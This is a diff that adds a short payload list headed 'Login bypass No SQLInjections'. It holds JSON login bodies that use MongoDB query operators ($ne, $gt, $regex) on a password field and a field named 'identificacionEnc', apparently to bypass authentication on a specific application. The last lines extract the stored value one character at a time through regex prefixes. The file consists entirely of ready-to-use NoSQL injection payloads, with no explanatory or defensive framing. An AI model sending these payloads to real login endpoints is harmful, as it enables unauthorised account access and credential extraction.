@@ -1,0 +1,10 @@
+==============================================================================
+[+] Login bypass No SQLInjections 
+==============================================================================
+{"password": {"$ne": null}, "identificacionEnc": {"$ne": null}}
+{"password": {"$ne": "foo"}, "identificacionEnc": {"$ne": "bar"}}
+{"password": {"$gt": undefined}, "identificacionEnc": {"$gt": undefined}}
+{"password": {"$gt":""}, "identificacionEnc": {"$gt":""}}
+{"password": {"$eq": "admin"}, "identificacionEnc": {"$regex": "^m" }}
+{"password": {"$eq": "admin"}, "identificacionEnc": {"$regex": "^md" }}
+{"password": {"$eq": "admin"}, "identificacionEnc": {"$regex": "^mdp" }}
